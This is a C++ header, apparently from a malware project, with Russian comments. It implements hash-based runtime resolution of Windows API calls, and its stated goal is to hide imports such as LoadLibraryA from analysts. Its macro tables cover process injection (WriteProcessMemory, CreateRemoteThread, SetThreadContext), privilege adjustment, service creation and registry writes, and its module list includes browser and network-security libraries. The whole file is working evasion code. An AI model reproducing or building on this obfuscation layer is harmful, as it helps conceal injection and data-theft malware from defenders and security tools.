//
// Назначение этого модуля -- работа с системными вызовами WinAPI без их импорта в программу.
// Это полезно для затруднения анализа dll -- в ней не будет имен вроде LoadLibraryA, GetProcAddress итд.
// Вместо этого мы используем таблицы импорта процесса-носителя, начиная с kernel32
// и подгружая в него модули (или используя уже загруженные) по мере надобности.
// По таблице импорта можно найти адреса нужных нам вызовов.
//

#ifndef GetApiH
#define GetApiH
//----------------------------------------------------------------------------
#pragma once
#include <windows.h>


//*******************************************************************
//  InitializeAPI - Функция инициализирует систему для работы с АПИ
//
//  ВАЖНО!!!!!!!
//
//  Перед использованием АПИ в процессе необходимо провести
//  инициализацию
//
//
//*******************************************************************
BOOL InitializeAPI();

//--------------------------------------------------
//  GetPEB - Функция возвращает адрес структуры PEB
//--------------------------------------------------
LPVOID GetPEB();


//--------------------------------------------------
//  GetImageBase - Функция возвращает базовый
//                 адрес загруженного образа
//  ProcAddr - Адрес функции с которого начинается
//             поиск. Если не указать, то будет
//             использован адрес самой функции
//--------------------------------------------------
LPVOID WINAPI GetImageBase(LPVOID ProcAddr = NULL);


LPVOID GetApiAddr( HMODULE hModule, DWORD dwProcNameHash );
HMODULE GetDllBase( DWORD dwDllHash );
HMODULE GetKernel32();

#ifdef _WIN64
#  define ADDR DWORDLONG
#else
#define   ADDR DWORD
#endif

#define RVATOVA( base, offset ) ( (ADDR)base + (ADDR)offset )

LPVOID GetProcAddressEx( char *Dll, DWORD dwModule, DWORD dwProcNameHash);
LPVOID GetProcAddressEx2( char *Dll, DWORD dwModule, DWORD dwProcNameHash, int CacheIndex);

//DWORD pGetLastError();


template <DWORD h, DWORD hash, int CacheIndex>
inline LPVOID pushargEx()
{
	typedef LPVOID (WINAPI *newfunc)();
	newfunc func = (newfunc)GetProcAddressEx2(NULL, h, hash, CacheIndex );
	if (func != NULL)
		return func();
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A>
inline LPVOID pushargEx(A a1)
{
	typedef LPVOID (WINAPI *newfunc)(A);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	if (func != NULL)
		return func(a1);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B>
inline LPVOID pushargEx(A a1,  B a2)
{
	typedef LPVOID (WINAPI *newfunc)(A, B);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	if (func != NULL)
		return func(a1,a2);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C>
inline LPVOID pushargEx(A a1,  B a2, C a3)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	if (func != NULL)
		return func(a1,a2,a3);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	if (func != NULL)
		return func(a1,a2,a3,a4);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	if (func != NULL)
		return func(a1, a2, a3, a4, a5);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	if (func != NULL)
		return func(a1, a2, a3, a4, a5, a6);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	if (func != NULL)
		return func(a1, a2, a3, a4, a5, a6, a7);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	if (func != NULL)
		return func(a1, a2, a3, a4, a5, a6, a7, a8);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	if (func != NULL)
		return func(a1, a2, a3, a4, a5, a6, a7, a8, a9);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	if (func != NULL)
		return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X, class Y>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10, Y a11 )
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X, Y);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	if (func != NULL)
		return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X, class Y, class Z, class R>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10, Y a11, Z a12, R a13)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X, Y, Z, R);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	if (func != NULL)
		return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A1, class A2, class A3, class A4, class A5,
	class A6, class A7, class A8, class A9, class A10, class A11, class A12>
inline LPVOID pushargEx(A1 a1, A2 a2, A3 a3, A4 a4, A5 a5, A6 a6, A7 a7, A8 a8,
						A9 a9, A10 a10, A11 a11, A12 a12)
{
	typedef LPVOID (WINAPI *newfunc)(A1, A2, A3, A4, A5, A6, A7, A8, A9, A10,
									A11, A12);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	if (func != NULL)
		return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12);
	return NULL;
}




//******************************************************************
//
//  ФАЖНО!!!!
//
//  Индексы кэша (третий параметр в объявлении) строжайше запрещено
//  менять вручную!!!!
//
//  Индексы кэша автоматически проставляет служебная утилита.
//  При добавлении новой функции, индекс указывать 0
//
//  Например:
//
//  #define pCustomFunc pushargEx< DLL_KERNEL32, 0xC8AC8026, 1 >
//
//******************************************************************




// включает обратную совместимость со старым вариантом расчета хешей GetApi
// ВНИМАНИЕ! Нужно также изменить способ обсчета хешей в StrImplementation.cpp 
// функция CHARAPI(DWORD)::Hash(const TChar* Str, DWORD Len, bool LowerCase)
// туда этот макрос не пробрасывается
#define OLD_GETAPI_HASH
//#undef OLD_GETAPI_HASH

#ifndef OLD_GETAPI_HASH

#define KERNEL32_HASH 0xCE03867E
#define GETPROCADDR_HASH 0x01FC921B
#define LOADLIBRARY_HASH 0x4DB0F8D6



enum TDllId {
    DLL_KERNEL32 = 2461,
    DLL_ADVAPI32 = 15204,
    DLL_USER32 = 32137,
    DLL_WINSOCK = 13662,
    DLL_NTDLL = 17668,
    DLL_WINSTA = 6868,
    DLL_SHELL32 = 19598,
    DLL_WININET = 6544,
    DLL_URLMON = 22765,
    DLL_NSPR4 = 215,
    DLL_SSL3 = 2947,
    DLL_WINMM = 1781,
    DLL_CABINET = 6702,
    DLL_OPERA = 2052,
    DLL_GDI = 24436,
    DLL_GDIPLUS = 28669,
    DLL_CRYPT32 = 19657,
    DLL_PSAPI = 21086,
    DLL_SHLWAPI = 22566,
    DLL_IPHLPAPI = 996,
    DLL_WINSPOOL = 1880,
    DLL_COMMDLG32 = 28456,
    DLL_ODBC32 = 3745,
    DLL_VERSION = 25384,
    DLL_OLE32 = 26030,
    DLL_IMAGEHLP = 21243,
    DLL_CRYPTDLL = 3308,
    DLL_NSS3 = 30784,
};

//**************************************************
// Размер кэша хранения адресов функций
//
// Значение автоматически устанавливается утилитой
//
// Не переименовывать, не изменять значение!!!!!!!
//
//**************************************************

const static int ApiCacheSize = 571;
#pragma region Объявления обфусцированных функций


// kernel32
#pragma region kernel32

#define pLoadLibraryA		pushargEx< DLL_KERNEL32, 0x4DB0F8D6, 240 >
#define pLoadLibraryW		pushargEx< DLL_KERNEL32, 0x4DB0F8C0, 532 >
#define pLoadLibraryExA		pushargEx< DLL_KERNEL32, 0x3E34F69F, 332 >
#define pLoadLibraryExW		pushargEx< DLL_KERNEL32, 0x3E34F689, 363 >
#define pFreeLibrary		pushargEx< DLL_KERNEL32, 0xCE99637E, 428 >
#define pGetProcAddress		pushargEx< DLL_KERNEL32, 0x01FC921B, 11 >
#define pTerminateProcess		pushargEx< DLL_KERNEL32, 0x8052B67F, 41 >
#define pVirtualAlloc		pushargEx< DLL_KERNEL32, 0xEC66120E, 387 >
#define pVirtualAllocEx		pushargEx< DLL_KERNEL32, 0x8483C053, 266 >
#define pVirtualFree		pushargEx< DLL_KERNEL32, 0xBF3F48AF, 462 >
#define pVirtualFreeEx		pushargEx< DLL_KERNEL32, 0xD22B9485, 191 >
#define pVirtualQuery		pushargEx< DLL_KERNEL32, 0xEF445C95, 348 >
#define pVirtualQueryEx		pushargEx< DLL_KERNEL32, 0x1725009B, 469 >
#define pVirtualProtect		pushargEx< DLL_KERNEL32, 0xB7E217AF, 85 >
#define pVirtualProtectEx		pushargEx< DLL_KERNEL32, 0x85EB96B2, 401 >
#define pCloseHandle		pushargEx< DLL_KERNEL32, 0xF7348825, 162 >
#define pGlobalAlloc		pushargEx< DLL_KERNEL32, 0xF7549981, 62 >
#define pGlobalFree		pushargEx< DLL_KERNEL32, 0xA1092DB8, 142 >
#define pCreateFileA		pushargEx< DLL_KERNEL32, 0x8DF2C9E4, 170 >
#define pCreateFileW		pushargEx< DLL_KERNEL32, 0x8DF2C9F2, 399 >
#define pWriteFile		pushargEx< DLL_KERNEL32, 0x8A35C5EA, 342 >
#define pGetCurrentDirectoryA		pushargEx< DLL_KERNEL32, 0x0F881D9F, 20 >
#define pWriteProcessMemory		pushargEx< DLL_KERNEL32, 0xF92FA108, 24 >
#define pCreateRemoteThread		pushargEx< DLL_KERNEL32, 0xA1976A8E, 459 >
#define pReadFile		pushargEx< DLL_KERNEL32, 0x7F75F542, 335 >
#define pSetFilePointer		pushargEx< DLL_KERNEL32, 0xF17498CF, 97 >
#define pSetEndOfFile		pushargEx< DLL_KERNEL32, 0xA811E591, 78 >
#define pCopyFileA		pushargEx< DLL_KERNEL32, 0xABEEE524, 118 >
#define pCopyFileW		pushargEx< DLL_KERNEL32, 0xABEEE532, 161 >
#define pMoveFileA		pushargEx< DLL_KERNEL32, 0xA5EEFDC4, 268 >
#define pMoveFileW		pushargEx< DLL_KERNEL32, 0xA5EEFDD2, 136 >
#define pMoveFileExA		pushargEx< DLL_KERNEL32, 0xBF704C88, 316 >
#define pMoveFileExW		pushargEx< DLL_KERNEL32, 0xBF704C9E, 425 >
#define pDeleteFileA		pushargEx< DLL_KERNEL32, 0x04FAC82F, 145 >
#define pDeleteFileW		pushargEx< DLL_KERNEL32, 0x04FAC839, 253 >
#define pGetFileSize		pushargEx< DLL_KERNEL32, 0x2BFDF301, 400 >
#define pCreateFileMappingA		pushargEx< DLL_KERNEL32, 0xA8853B8A, 60 >
#define pCreateFileMappingW		pushargEx< DLL_KERNEL32, 0xA8853B9C, 239 >
#define pMapViewOfFile		pushargEx< DLL_KERNEL32, 0x8BF1ECC0, 104 >
#define pGetFileTime		pushargEx< DLL_KERNEL32, 0x2B1DF881, 80 >
#define pSetFileTime		pushargEx< DLL_KERNEL32, 0x2B1DFD81, 370 >
#define pGetModuleHandleA		pushargEx< DLL_KERNEL32, 0xBAB0795F, 531 >
#define pGetModuleHandleW		pushargEx< DLL_KERNEL32, 0xBAB07949, 157 >
#define pUnmapViewOfFile		pushargEx< DLL_KERNEL32, 0x69F1EF5A, 305 >
#define pWaitForSingleObject		pushargEx< DLL_KERNEL32, 0x02CC6AE2, 529 >
#define pSleep		pushargEx< DLL_KERNEL32, 0x0BF5AB4C, 185 >
#define pWideCharToMultiByte		pushargEx< DLL_KERNEL32, 0x20C049FF, 477 >
#define pMultiByteToWideChar		pushargEx< DLL_KERNEL32, 0x9D28F91A, 16 >
#define pGetModuleFileNameA		pushargEx< DLL_KERNEL32, 0x30CC8DD5, 405 >
#define pGetModuleFileNameW		pushargEx< DLL_KERNEL32, 0x30CC8DC3, 487 >
#define pGetSystemDirectoryA		pushargEx< DLL_KERNEL32, 0x8E2E295B, 446 >
#define pGetSystemDirectoryW		pushargEx< DLL_KERNEL32, 0x8E2E294D, 267 >
#define pGetTempPathA		pushargEx< DLL_KERNEL32, 0xDDE2024E, 475 >
#define pGetTempPathW		pushargEx< DLL_KERNEL32, 0xDDE20258, 310 >
#define pGetVolumeInformationA		pushargEx< DLL_KERNEL32, 0xA068F6C6, 159 >
#define pGetVolumeInformationW		pushargEx< DLL_KERNEL32, 0xA068F6D0, 567 >
#define pSetFileAttributesA		pushargEx< DLL_KERNEL32, 0x0ADA998A, 147 >
#define pSetFileAttributesW		pushargEx< DLL_KERNEL32, 0x0ADA999C, 55 >
#define pCreateProcessA		pushargEx< DLL_KERNEL32, 0x580DF232, 422 >
#define pCreateProcessW		pushargEx< DLL_KERNEL32, 0x580DF224, 182 >
#define pGetVersionExA		pushargEx< DLL_KERNEL32, 0x127476D4, 561 >
#define pGetVersionExW		pushargEx< DLL_KERNEL32, 0x127476C2, 330 >
#define pCreateThread		pushargEx< DLL_KERNEL32, 0xEAA4E200, 359 >
#define pSetThreadPriority		pushargEx< DLL_KERNEL32, 0xA2A93DA8, 512 >
#define pCreateMutexA		pushargEx< DLL_KERNEL32, 0x3A64EE6C, 308 >
#define pCreateMutexW		pushargEx< DLL_KERNEL32, 0x3A64EE7A, 51 >
#define pReleaseMutex		pushargEx< DLL_KERNEL32, 0x3E68DC52, 238 >
#define pGetVersion		pushargEx< DLL_KERNEL32, 0x4E993892, 23 >
#define pDeviceIoControl		pushargEx< DLL_KERNEL32, 0x1612FB4E, 259 >
#define pQueryDosDeviceA		pushargEx< DLL_KERNEL32, 0xB2BDC4F6, 491 >
#define pQueryDosDeviceW		pushargEx< DLL_KERNEL32, 0xB2BDC4E0, 306 >
#define pIsBadReadPtr		pushargEx< DLL_KERNEL32, 0xF848354D, 448 >
#define pIsBadWritePtr		pushargEx< DLL_KERNEL32, 0x22B9F97D, 15 >
#define pGetCurrentProcess		pushargEx< DLL_KERNEL32, 0x1306B338, 216 >
#define pCreateEventW		pushargEx< DLL_KERNEL32, 0x0846283A, 158 >
#define pSetEvent		pushargEx< DLL_KERNEL32, 0x6974F4F9, 254 >
#define pResetEvent		pushargEx< DLL_KERNEL32, 0xBE34F489, 56 >
#define pGetShortPathNameA		pushargEx< DLL_KERNEL32, 0x3CBD88D0, 437 >
#define pGetShortPathNameW		pushargEx< DLL_KERNEL32, 0x3CBD88C6, 122 >
#define pLocalFree		pushargEx< DLL_KERNEL32, 0x010929C2, 334 >
#define pGetPrivateProfileStringA		pushargEx< DLL_KERNEL32, 0xA00DCBA6, 154 >
#define pGetPrivateProfileStringW		pushargEx< DLL_KERNEL32, 0xA00DCBB0, 509 >
#define pGetFileAttributesA		pushargEx< DLL_KERNEL32, 0x00DA998A, 173 >
#define pGetFileAttributesW		pushargEx< DLL_KERNEL32, 0x00DA999C, 528 >
#define pGetEnvironmentVariableA		pushargEx< DLL_KERNEL32, 0x9216C763, 205 >
#define pGetEnvironmentVariableW		pushargEx< DLL_KERNEL32, 0x9216C775, 296 >
#define pReadProcessMemory		pushargEx< DLL_KERNEL32, 0x838FB95C, 534 >
#define pExitProcess		pushargEx< DLL_KERNEL32, 0x109A13E9, 235 >
#define pOpenProcess		pushargEx< DLL_KERNEL32, 0x1CAE116D, 472 >
#define pGetCurrentProcessId		pushargEx< DLL_KERNEL32, 0xACCE7997, 413 >
#define pProcess32First		pushargEx< DLL_KERNEL32, 0x07CBF465, 131 >
#define pProcess32Next		pushargEx< DLL_KERNEL32, 0x470C92EE, 553 >
#define pCreateToolhelp32Snapshot		pushargEx< DLL_KERNEL32, 0x51D5F878, 331 >
#define pWinExec		pushargEx< DLL_KERNEL32, 0xDED17984, 519 >
#define pFindResourceA		pushargEx< DLL_KERNEL32, 0x86C27EFC, 367 >
#define pSetLastError		pushargEx< DLL_KERNEL32, 0x978979DC, 280 >
#define pLoadResource		pushargEx< DLL_KERNEL32, 0x9F0CC57B, 389 >
#define pLockResource		pushargEx< DLL_KERNEL32, 0x900CC57A, 207 >
#define pSizeofResource		pushargEx< DLL_KERNEL32, 0x98BA07FB, 250 >
#define pLockRsrc		pushargEx< DLL_KERNEL32, 0x8DCF5254, 169 >
#define pGetTempFileNameA		pushargEx< DLL_KERNEL32, 0x1199EB3F, 555 >
#define pGetTempFileNameW		pushargEx< DLL_KERNEL32, 0x1199EB29, 350 >
#define pGetLongPathNameA		pushargEx< DLL_KERNEL32, 0x8608CB9C, 463 >
#define pCreateEventA		pushargEx< DLL_KERNEL32, 0x0846282C, 465 >
#define pConnectNamedPipe		pushargEx< DLL_KERNEL32, 0x6C08EE33, 461 >
#define pDisconnectNamedPipe		pushargEx< DLL_KERNEL32, 0x8149AE0E, 383 >
#define pCreateNamedPipeA		pushargEx< DLL_KERNEL32, 0x5CC4A575, 73 >
#define pGetTickCount		pushargEx< DLL_KERNEL32, 0xEC3A79A2, 9 >
#define pExitThread		pushargEx< DLL_KERNEL32, 0xF380B610, 81 >
#define plstrcmpiA		pushargEx< DLL_KERNEL32, 0xD451F37E, 237 >
#define pSuspendThread		pushargEx< DLL_KERNEL32, 0x6086264A, 287 >
#define pGetComputerNameA		pushargEx< DLL_KERNEL32, 0x23D28F87, 340 >
#define pGetThreadContext		pushargEx< DLL_KERNEL32, 0xB420FE12, 442 >
#define pSetThreadContext		pushargEx< DLL_KERNEL32, 0xB420D612, 317 >
#define pResumeThread		pushargEx< DLL_KERNEL32, 0xFE94C7CB, 456 >
#define pProcessIdToSessionId		pushargEx< DLL_KERNEL32, 0xA2C037CF, 397 >
#define pWTSGetActiveConsoleSessionId		pushargEx< DLL_KERNEL32, 0x0382758D, 28 >
#define pOpenMutexA		pushargEx< DLL_KERNEL32, 0x2B58D279, 214 >
#define pCreateProcessInternalA		pushargEx< DLL_KERNEL32, 0x2057BCB5, 368 >
#define pCreateProcessInternalW		pushargEx< DLL_KERNEL32, 0x2057BCA3, 439 >
#define pTerminateThread		pushargEx< DLL_KERNEL32, 0xDEA1275B, 484 >
#define plopen		pushargEx< DLL_KERNEL32, 0xFB90EB51, 249 >
#define plstrcmpA		pushargEx< DLL_KERNEL32, 0x1BA8A3CF, 481 >
#define plstrcmpW		pushargEx< DLL_KERNEL32, 0x1BA8A3D9, 277 >
#define plstrcatA		pushargEx< DLL_KERNEL32, 0x1BABA1CF, 247 >
#define plstrcatW		pushargEx< DLL_KERNEL32, 0x1BABA1D9, 21 >
#define plstrcpyA		pushargEx< DLL_KERNEL32, 0x1BAFE74F, 178 >
#define plstrcpyW		pushargEx< DLL_KERNEL32, 0x1BAFE759, 35 >
#define plstrlenA		pushargEx< DLL_KERNEL32, 0x1A4AACCF, 344 >
#define plstrlenW		pushargEx< DLL_KERNEL32, 0x1A4AACD9, 251 >
#define pThread32First		pushargEx< DLL_KERNEL32, 0x07851022, 560 >
#define pThread32Next		pushargEx< DLL_KERNEL32, 0xC90C0F26, 135 >
#define pOpenThread		pushargEx< DLL_KERNEL32, 0xFB98DE15, 426 >
#define pGetWindowsDirectoryA		pushargEx< DLL_KERNEL32, 0xBF3F042F, 176 >
#define pGetWindowsDirectoryW		pushargEx< DLL_KERNEL32, 0xBF3F0439, 209 >
#define pFindFirstFileA		pushargEx< DLL_KERNEL32, 0x2C7F5CB1, 217 >
#define pFindFirstFileW		pushargEx< DLL_KERNEL32, 0x2C7F5CA7, 270 >
#define pFindNextFileA		pushargEx< DLL_KERNEL32, 0xA9A19227, 103 >
#define pFindNextFileW		pushargEx< DLL_KERNEL32, 0xA9A19231, 230 >
#define pFindClose		pushargEx< DLL_KERNEL32, 0xFE4256E8, 556 >
#define pRemoveDirectoryA		pushargEx< DLL_KERNEL32, 0x54DA4916, 89 >
#define pInitializeCriticalSection		pushargEx< DLL_KERNEL32, 0xD095276F, 202 >
#define pEnterCriticalSection		pushargEx< DLL_KERNEL32, 0x34374754, 480 >
#define pLeaveCriticalSection		pushargEx< DLL_KERNEL32, 0xFEA46876, 160 >
#define pDeleteCriticalSection		pushargEx< DLL_KERNEL32, 0xBCA90D54, 441 >
#define pGetProcessHeap		pushargEx< DLL_KERNEL32, 0x76BC0BA1, 34 >
#define pHeapAlloc		pushargEx< DLL_KERNEL32, 0xD05AA44E, 325 >
#define pHeapReAlloc		pushargEx< DLL_KERNEL32, 0x7970560D, 356 >
#define pHeapSize		pushargEx< DLL_KERNEL32, 0x3DE1FE43, 409 >
#define pHeapFree		pushargEx< DLL_KERNEL32, 0x3F4731C3, 517 >
#define pGetCurrentThreadId		pushargEx< DLL_KERNEL32, 0xE3D42937, 187 >
#define pGetCurrentThread		pushargEx< DLL_KERNEL32, 0x51878F51, 179 >
#define pGlobalLock		pushargEx< DLL_KERNEL32, 0xA04E6EB6, 281 >
#define pGlobalUnlock		pushargEx< DLL_KERNEL32, 0x8A4CC082, 526 >
#define pSetErrorMode		pushargEx< DLL_KERNEL32, 0xE9483890, 544 >
#define pGetFileInformationByHandle		pushargEx< DLL_KERNEL32, 0xFB0427F3, 188 >
#define pFileTimeToLocalFileTime		pushargEx< DLL_KERNEL32, 0xEF6D06C7, 124 >
#define pFileTimeToDosDateTime		pushargEx< DLL_KERNEL32, 0x710A96A9, 298 >
#define pOutputDebugStringA		pushargEx< DLL_KERNEL32, 0x97C692E9, 371 >
#define pExpandEnvironmentStringsA		pushargEx< DLL_KERNEL32, 0x29FF72BC, 406 >
#define pExpandEnvironmentStringsW		pushargEx< DLL_KERNEL32, 0x29FF72AA, 440 >
#define pOutputDebugStringW		pushargEx< DLL_KERNEL32, 0x97C692FF, 505 >
#define pLocalAlloc		pushargEx< DLL_KERNEL32, 0xF756A4D1, 37 >
#define pFindFirstChangeNotificationA		pushargEx< DLL_KERNEL32, 0x684999D1, 361 >
#define pFindCloseChangeNotification		pushargEx< DLL_KERNEL32, 0x10F94336, 227 >
#define pFindNextChangeNotification		pushargEx< DLL_KERNEL32, 0xF0FE6546, 139 >
#define pCreateDirectoryW		pushargEx< DLL_KERNEL32, 0x143A2B5C, 453 >
#define pCreateDirectoryA		pushargEx< DLL_KERNEL32, 0x143A2B4A, 31 >
#define pOpenEventW		pushargEx< DLL_KERNEL32, 0x197A142F, 274 >
#define pGetSystemTimeAsFileTime		pushargEx< DLL_KERNEL32, 0x6345C179, 351 >
#define pGetSystemTime		pushargEx< DLL_KERNEL32, 0xA93D6012, 490 >
#define pFileTimeToSystemTime		pushargEx< DLL_KERNEL32, 0xFCCD970E, 497 >
#define pCompareFileTime		pushargEx< DLL_KERNEL32, 0x5FF5B2C8, 265 >
#define pSystemTimeToFileTime		pushargEx< DLL_KERNEL32, 0x2DF1A170, 338 >
#define pGetLogicalDriveStringsA		pushargEx< DLL_KERNEL32, 0x7AE2D662, 495 >
#define pGetDriveTypeA		pushargEx< DLL_KERNEL32, 0xB7AF2C3E, 4 >
#define pSleepEx		pushargEx< DLL_KERNEL32, 0x6AD379B7, 563 >
#define pGetProcessId		pushargEx< DLL_KERNEL32, 0x8B8DDA70, 288 >
#define pOpenEventA		pushargEx< DLL_KERNEL32, 0x197A1439, 384 >
#define pSetCurrentDirectoryW		pushargEx< DLL_KERNEL32, 0x0F881F09, 126 >
#define pSetCurrentDirectoryA		pushargEx< DLL_KERNEL32, 0x0F881F1F, 408 >
#define pDuplicateHandle		pushargEx< DLL_KERNEL32, 0x4D01417C, 133 >
#define pGetExitCodeThread		pushargEx< DLL_KERNEL32, 0x50D50E8C, 140 >
#define pGetCommandLineA		pushargEx< DLL_KERNEL32, 0x118C0931, 283 >
#define pGetPrivateProfileIntA		pushargEx< DLL_KERNEL32, 0xD6482E29, 533 >
#define pProcess32FirstW		pushargEx< DLL_KERNEL32, 0xE5FA3266, 444 >
#define pProcess32NextW		pushargEx< DLL_KERNEL32, 0x864977C6, 353 >
#define pGetLogicalDrives		pushargEx< DLL_KERNEL32, 0x740E688A, 286 >
#define pInterlockedIncrement		pushargEx< DLL_KERNEL32, 0x17B36549, 141 >
#define pInterlockedDecrement		pushargEx< DLL_KERNEL32, 0x1AA56549, 167 >
#define pFlushViewOfFile		pushargEx< DLL_KERNEL32, 0x7873A916, 494 >
#define pGetExitCodeProcess		pushargEx< DLL_KERNEL32, 0xBA465DB8, 301 >
#define pFlushFileBuffers		pushargEx< DLL_KERNEL32, 0x3112F0E7, 93 >
#define pGetStartupInfoA		pushargEx< DLL_KERNEL32, 0x5E466657, 290 >
#define _pGetLastError		pushargEx< DLL_KERNEL32, 0x978BF9DC, 148 >
#define pWritePrivateProfileStringA		pushargEx< DLL_KERNEL32, 0xE4F78BFA, 123 >
#define pIsWow64Process		pushargEx< DLL_KERNEL32, 0x1B16B969, 486 >
#define pGetNativeSystemInfo		pushargEx< DLL_KERNEL32, 0xB3393AAF, 394 >

#pragma endregion

// advapi32
#pragma region advapi32

#define pCreateProcessAsUserA		pushargEx< DLL_ADVAPI32, 0x5FDD6F95, 67 >
#define pSetThreadToken		pushargEx< DLL_ADVAPI32, 0xBF539808, 460 >
#define pOpenProcessToken		pushargEx< DLL_ADVAPI32, 0x9EE6A03A, 201 >
#define pLookupPrivilegeValueA		pushargEx< DLL_ADVAPI32, 0xDCB93AE8, 558 >
#define pLookupPrivilegeValueW		pushargEx< DLL_ADVAPI32, 0xDCB93AFE, 427 >
#define pAdjustTokenPrivileges		pushargEx< DLL_ADVAPI32, 0xBDA54F8D, 478 >
#define pRegOpenKeyExA		pushargEx< DLL_ADVAPI32, 0x24EA0708, 489 >
#define pRegOpenKeyExW		pushargEx< DLL_ADVAPI32, 0x24EA071E, 38 >
#define pRegQueryInfoKeyA		pushargEx< DLL_ADVAPI32, 0xA3C9C524, 557 >
#define pRegQueryInfoKeyW		pushargEx< DLL_ADVAPI32, 0xA3C9C532, 289 >
#define pRegEnumKeyExA		pushargEx< DLL_ADVAPI32, 0x3ACA0B0D, 189 >
#define pRegEnumKeyExW		pushargEx< DLL_ADVAPI32, 0x3ACA0B1B, 223 >
#define pRegEnumValueA		pushargEx< DLL_ADVAPI32, 0x78660565, 261 >
#define pRegEnumValueW		pushargEx< DLL_ADVAPI32, 0x78660573, 33 >
#define pRegQueryValueExA		pushargEx< DLL_ADVAPI32, 0x063FF9F5, 378 >
#define pRegQueryValueExW		pushargEx< DLL_ADVAPI32, 0x063FF9E3, 294 >
#define pRegCloseKey		pushargEx< DLL_ADVAPI32, 0x5E3F6DC4, 377 >
#define pRegDeleteKeyA		pushargEx< DLL_ADVAPI32, 0xB7B02A75, 445 >
#define pRegDeleteKeyW		pushargEx< DLL_ADVAPI32, 0xB7B02A63, 245 >
#define pRegSetValueExA		pushargEx< DLL_ADVAPI32, 0x207C7723, 17 >
#define pRegSetValueExW		pushargEx< DLL_ADVAPI32, 0x207C7735, 256 >
#define pGetUserNameA		pushargEx< DLL_ADVAPI32, 0x3CC864DF, 27 >
#define pGetUserNameW		pushargEx< DLL_ADVAPI32, 0x3CC864C9, 137 >
#define pCreateServiceA		pushargEx< DLL_ADVAPI32, 0x098FA5DB, 358 >
#define pOpenServiceA		pushargEx< DLL_ADVAPI32, 0x068AE194, 395 >
#define pDeleteService		pushargEx< DLL_ADVAPI32, 0x5061FD08, 304 >
#define pStartServiceA		pushargEx< DLL_ADVAPI32, 0x929D85DF, 110 >
#define pGetKernelObjectSecurity		pushargEx< DLL_ADVAPI32, 0xB8851E8E, 86 >
#define pOpenSCManagerA		pushargEx< DLL_ADVAPI32, 0xBE523D69, 295 >
#define pGetCurrentHwProfileA		pushargEx< DLL_ADVAPI32, 0x310BCFF8, 564 >
#define pGetTokenInformation		pushargEx< DLL_ADVAPI32, 0x1363D948, 511 >
#define pInitializeSecurityDescriptor		pushargEx< DLL_ADVAPI32, 0xDE9E1173, 58 >
#define pSetSecurityDescriptorOwner		pushargEx< DLL_ADVAPI32, 0xD090C2A3, 468 >
